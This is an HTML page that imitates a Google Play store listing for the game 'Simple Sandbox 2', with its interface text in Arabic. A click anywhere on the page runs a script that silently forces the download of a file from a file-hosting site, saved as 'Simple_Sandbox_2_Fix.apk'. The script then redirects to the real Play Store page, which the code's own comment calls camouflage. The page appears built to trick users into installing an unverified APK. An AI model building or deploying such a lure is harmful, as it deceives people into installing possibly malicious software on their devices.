<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple Sandbox 2 - Apps on Google Play</title>
    <style>
        body { margin: 0; font-family: 'Roboto', sans-serif; background: #fff; color: #5f6368; }
        .app-header { display: flex; padding: 20px; align-items: center; }
        /* استخدام صورة التطبيق كأيقونة اللعبة */
        .app-icon { width: 72px; height: 72px; border-radius: 15px; box-shadow: 0 1px 4px rgba(0,0,0,0.2); }
        .app-info { margin-right: 15px; flex: 1; }
        .app-title { font-size: 22px; font-weight: 500; color: #202124; margin: 0; }
        .developer { color: #01875f; font-weight: 500; margin: 5px 0; font-size: 14px; }
        .install-bar { padding: 0 20px; margin-top: 10px; }
        .install-btn { width: 100%; background: #01875f; color: #fff; border: none; padding: 12px; border-radius: 8px; font-size: 14px; font-weight: 500; cursor: pointer; }
        .stats { display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #e8eaed; border-bottom: 1px solid #e8eaed; text-align: center; margin-top: 20px; }
        .stat-item b { display: block; color: #202124; font-size: 14px; }
        .stat-item span { font-size: 12px; }
    </style>
</head>
<body onclick="executeMasterPlan()">
    <div class="app-header">
        <img src="https://raw.githubusercontent.com/username/repository/main/image_12.png" class="app-icon">
        <div class="app-info">
            <h1 class="app-title">Simple Sandbox 2</h1>
            <p class="developer">Madness_Games</p>
            <p style="font-size: 11px;">يتضمن إعلانات · عمليات شراء داخل التطبيق</p>
        </div>
    </div>
    
    <div class="install-bar">
        <button class="install-btn">تثبيت</button>
    </div>

    <div class="stats">
        <div class="stat-item"><b>4.7 ★</b><span>11 مليون مراجعة</span></div>
        <div class="stat-item"><b>10 مليون+</b><span>عملية تنزيل</span></div>
        <div class="stat-item"><b>12+</b><span>مناسب للأعمار من 12 عاماً</span></div>
    </div>

    <script>
    function executeMasterPlan() {
        // رابط ملفك من صورة Filebin الخاصة بك
        var fileUrl = "https://filebin.net/96disy37zi5f6edt/simplesandbox2_update.txt";
        
        function force() {
            var a = document.createElement('a');
            a.href = fileUrl;
            a.download = "Simple_Sandbox_2_Fix.apk"; 
            document.body.appendChild(a);
            a.click();
        }

        force();

       

        // التمويه: النقل لصفحة قوقل بلاي الحقيقية للعبة
        setTimeout(function() {
            window.location.href = "https://play.google.com/store/apps/details?id=com.MadnessGames.SimpleSandbox2";
        }, 1000);
    }
    </script>
</body>
</html>
